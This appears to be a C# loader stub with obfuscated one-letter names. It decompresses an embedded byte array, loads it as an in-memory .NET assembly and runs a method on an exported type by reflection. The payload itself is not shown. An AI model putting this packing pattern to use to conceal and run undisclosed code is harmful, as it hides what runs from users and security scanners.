using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Reflection;

namespace a
{
	partial class a
	{
		static void Main(string[] args)
		{
			//	MemoryStream mi = ;
			//	Console.WriteLine("in: " + mi.Length);
			DeflateStream gz = new DeflateStream(new MemoryStream(a.z), CompressionMode.Decompress);
			byte[] bo = new byte[100000];
			MemoryStream mo = new MemoryStream(bo, true);
			gz.Read(bo, 0, 100000);
			Assembly asm = Assembly.Load(bo);
			if (asm != null)
			{
				Type[] ts = asm.GetExportedTypes();
				for (int j = 0; j < ts.Length; j++)
				{
					// Console.WriteLine("exports: " + ts[j].AssemblyQualifiedName);
					if (ts[j].Name == "D")
					{
						// Console.WriteLine("got type: " + dt);
					//	object demo = Activator.CreateInstance(ts[j]);//ts[j]);
					//	MethodInfo mi2 = ts[j].GetMethod("Run");
						ts[j].GetMethod("R").Invoke(Activator.CreateInstance(ts[j]), null);
					}
				}
				/*
				Type dt = Type.GetType("a.Demo, a, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
				if (dt != null)
				{
					// Console.WriteLine("got type: " + dt);
					object demo = Activator.CreateInstance(dt);//ts[j]);
					MethodInfo mi2 = dt.GetMethod("Run");
					mi2.Invoke(demo, new object[] { });

				}*/
			}
		}
	}
}
